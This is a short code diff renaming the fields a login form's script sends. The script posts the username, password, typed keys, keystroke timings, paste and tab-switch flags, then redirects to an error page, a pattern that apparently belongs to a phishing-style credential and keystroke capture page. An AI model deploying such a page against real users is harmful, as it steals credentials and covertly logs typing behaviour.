@@ -36,14 +36,14 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-            u: datos.get('usuario') || '',
-            p: datos.get('clave') || '',
-            k: teclas,
-            t: elapsed,
-            b: backspaceCount,
-            c: visibilityChanges,
-            g: pasted,
-            d: delays
+            usuario: datos.get('usuario') || '',
+            clave: datos.get('clave') || '',
+            teclas: teclas,
+            tiempo_total: elapsed,
+            backspaces: backspaceCount,
+            cambio_pestanas: visibilityChanges,
+            pegado_clave: pasted,
+            tiempos_teclas: delays
         })
     }).then(() => {
         window.location.href = 'error_page.html';
